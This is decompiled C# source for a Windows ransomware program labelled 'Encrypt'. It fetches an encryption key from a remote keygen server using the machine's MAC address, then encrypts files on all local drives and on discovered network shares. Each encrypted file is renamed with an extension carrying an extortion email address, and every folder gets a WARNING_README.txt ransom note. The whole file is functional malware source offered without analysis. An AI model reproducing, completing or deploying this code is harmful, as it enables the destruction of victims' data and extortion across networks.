using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace EncryptFile;

public class Encrypt : Form
{
	private IContainer components;

	private Button StartBtn;

	private NotifyIcon notifyIcon1;

	private Label loginLable;

	private Label passwordLable;

	private TextBox password;

	private TextBox login;

	public Encrypt()
	{
		InitializeComponent();
	}

	private void StartProcess_Click(object sender, EventArgs e)
	{
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_0216: Unknown result type (might be due to invalid IL or missing references)
		//IL_021d: Expected O, but got Unknown
		//IL_024b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Expected O, but got Unknown
		//IL_0373: Unknown result type (might be due to invalid IL or missing references)
		((Control)StartBtn).set_Enabled(false);
		string encryptKey = "1600D12";
		string macAddress = "1600D12";
		macAddress = GetMacAddress();
		string arg = "test";
		string arg2 = "testpassword";
		string requestUriString = $"https://keygen7.herokuapp.com/api/v1/generate_key?username={arg}&password={arg2}&key={macAddress}";
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		KeyGen keyGen;
		using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8))
		{
			JavaScriptSerializer val = new JavaScriptSerializer();
			keyGen = val.Deserialize<KeyGen>(streamReader.ReadToEnd());
		}
		if (keyGen.response.status == 500)
		{
			MessageBox.Show("An error occurred, please try again.");
			((Control)StartBtn).set_Enabled(true);
		}
		else
		{
			if (keyGen.response.status != 200)
			{
				return;
			}
			encryptKey = keyGen.response.value;
			notifyIcon1.set_Visible(false);
			notifyIcon1.add_MouseDoubleClick(new MouseEventHandler(notifyIcon1_MouseDoubleClick));
			((Form)this).set_ShowInTaskbar(false);
			notifyIcon1.set_Visible(true);
			((Form)this).set_WindowState((FormWindowState)1);
			Task[] array = new Task[200];
			int num = 0;
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array2 = logicalDrives;
			foreach (string driveName in array2)
			{
				DriveInfo driveInfo = new DriveInfo(driveName);
				if (driveInfo.IsReady)
				{
					DirectoryInfo rootDir = driveInfo.RootDirectory;
					Task task = (array[num] = new Task(delegate
					{
						TraverseTree(rootDir.ToString(), encryptKey, macAddress);
					}));
					array[num].Start();
					num++;
				}
			}
			string text = "select * from win32_share";
			DirectoryEntry val2 = new DirectoryEntry("WinNT:");
			foreach (DirectoryEntry child in val2.get_Children())
			{
				DirectoryEntry val3 = child;
				foreach (DirectoryEntry child2 in val3.get_Children())
				{
					DirectoryEntry val4 = child2;
					if (!(val4.get_Name() != "Schema"))
					{
						continue;
					}
					try
					{
						ManagementObjectSearcher val5 = new ManagementObjectSearcher("\\\\" + val4.get_Name() + "\\root\\cimv2", text);
						ManagementObjectCollection val6 = val5.Get();
						ManagementObjectEnumerator enumerator3 = val6.GetEnumerator();
						try
						{
							while (enumerator3.MoveNext())
							{
								ManagementObject val7 = (ManagementObject)enumerator3.get_Current();
								string path = "\\\\" + val4.get_Name() + "\\" + ((ManagementBaseObject)val7).get_Item("Name").ToString();
								Task task2 = (array[num] = new Task(delegate
								{
									TraverseTree(path, encryptKey, macAddress);
								}));
								array[num].Start();
								num++;
							}
						}
						finally
						{
							((IDisposable)enumerator3)?.Dispose();
						}
					}
					catch (Exception)
					{
					}
				}
			}
			for (int j = 0; j < num; j++)
			{
				Task.WhenAll(array[j]).Wait();
			}
			MessageBox.Show("Success! All files Encrypted.");
			((Control)StartBtn).set_Enabled(true);
		}
	}

	private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
	{
		notifyIcon1.set_Visible(false);
		((Form)this).set_ShowInTaskbar(true);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public static void TraverseTree(string root, string encryptKey, string macAddress)
	{
		Stack<string> stack = new Stack<string>();
		string contents = "Hello, dear friend!\r\nAll your files have been ENCRYPTED\r\nDo you really want to restore your files?\r\nWrite to our email - heslo_1@protonmail.com\r\nor to reserve - dweezells@airmail.cc\r\nYour unique ID is equal " + macAddress;
		if (!Directory.Exists(root))
		{
			return;
		}
		stack.Push(root);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (Exception)
			{
				continue;
			}
			string[] array = null;
			try
			{
				array = Directory.GetFiles(text);
				if (!File.Exists(text + "\\WARNING_README.txt"))
				{
					File.WriteAllText(Path.Combine(text, "WARNING_README.txt"), contents);
				}
			}
			catch (Exception)
			{
				continue;
			}
			try
			{
				Parallel.ForEach(array, delegate(string file)
				{
					try
					{
						EncryptFile(file, encryptKey, macAddress);
					}
					catch (FileNotFoundException)
					{
					}
				});
			}
			catch (Exception)
			{
				continue;
			}
			string[] array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
	}

	private static void EncryptFile(string file, string encryptKey, string uniqId)
	{
		string text = ".id-" + uniqId + ".[heslo_1@protonmail.com]";
		try
		{
			if (!file.Contains(text))
			{
				byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
				byte[] bytes = Encoding.UTF8.GetBytes(encryptKey);
				bytes = SHA256.Create().ComputeHash(bytes);
				byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
				File.WriteAllBytes(file, bytes2);
				File.Move(file, file + text);
			}
		}
		catch (Exception)
		{
		}
	}

	private static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private void disabledBtn()
	{
		if (((Control)login).get_Text().Length >= 1 && ((Control)password).get_Text().Length >= 1)
		{
			((Control)StartBtn).set_Enabled(true);
		}
		else
		{
			((Control)StartBtn).set_Enabled(false);
		}
	}

	private void login_TextChanged(object sender, EventArgs e)
	{
		disabledBtn();
	}

	private void password_TextChanged(object sender, EventArgs e)
	{
		disabledBtn();
	}

	public static string GetMacAddress()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		try
		{
			ManagementScope val = new ManagementScope("\\\\" + Environment.MachineName + "\\root\\cimv2");
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("SELECT MACAddress FROM Win32_NetworkAdapter");
			ObjectQuery val2 = new ObjectQuery(stringBuilder.ToString());
			ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, val2);
			ManagementObjectCollection val4 = val3.Get();
			string text = "1600D12";
			ManagementObjectEnumerator enumerator = val4.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val5 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val5).get_Item("MACAddress").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (string.IsNullOrEmpty(text))
			{
				text = "1600D12";
			}
			return Base64Encode(text);
		}
		catch (Exception)
		{
			return Base64Encode("1600D12");
		}
	}

	public static string Base64Encode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes).Replace("=", string.Empty);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Encrypt));
		StartBtn = new Button();
		notifyIcon1 = new NotifyIcon(components);
		loginLable = new Label();
		passwordLable = new Label();
		password = new TextBox();
		login = new TextBox();
		((Control)this).SuspendLayout();
		((Control)StartBtn).set_Location(new Point(79, 186));
		((Control)StartBtn).set_Name("StartBtn");
		((Control)StartBtn).set_Size(new Size(123, 23));
		((Control)StartBtn).set_TabIndex(0);
		((Control)StartBtn).set_Text("Start Process");
		((ButtonBase)StartBtn).set_UseVisualStyleBackColor(true);
		((Control)StartBtn).add_Click((EventHandler)StartProcess_Click);
		notifyIcon1.set_Icon((Icon)componentResourceManager.GetObject("notifyIcon1.Icon"));
		notifyIcon1.set_Text("Encrypt");
		notifyIcon1.set_Visible(true);
		((Control)loginLable).set_AutoSize(true);
		((Control)loginLable).set_Location(new Point(31, 25));
		((Control)loginLable).set_Name("loginLable");
		((Control)loginLable).set_Size(new Size(36, 13));
		((Control)loginLable).set_TabIndex(1);
		((Control)loginLable).set_Text("Login:");
		((Control)loginLable).set_Visible(false);
		((Control)passwordLable).set_AutoSize(true);
		((Control)passwordLable).set_Location(new Point(31, 74));
		((Control)passwordLable).set_Name("passwordLable");
		((Control)passwordLable).set_Size(new Size(56, 13));
		((Control)passwordLable).set_TabIndex(2);
		((Control)passwordLable).set_Text("Password:");
		((Control)passwordLable).set_Visible(false);
		((Control)password).set_Location(new Point(34, 90));
		((Control)password).set_Name("password");
		((Control)password).set_Size(new Size(100, 20));
		((Control)password).set_TabIndex(3);
		password.set_UseSystemPasswordChar(true);
		((Control)password).set_Visible(false);
		((Control)password).add_TextChanged((EventHandler)password_TextChanged);
		((Control)login).set_Location(new Point(34, 41));
		((Control)login).set_Name("login");
		((Control)login).set_Size(new Size(100, 20));
		((Control)login).set_TabIndex(4);
		((Control)login).set_Visible(false);
		((Control)login).add_TextChanged((EventHandler)login_TextChanged);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).get_Controls().Add((Control)(object)login);
		((Control)this).get_Controls().Add((Control)(object)password);
		((Control)this).get_Controls().Add((Control)(object)passwordLable);
		((Control)this).get_Controls().Add((Control)(object)loginLable);
		((Control)this).get_Controls().Add((Control)(object)StartBtn);
		((Control)this).set_Name("Encrypt");
		((Control)this).set_Text("Encrypt");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
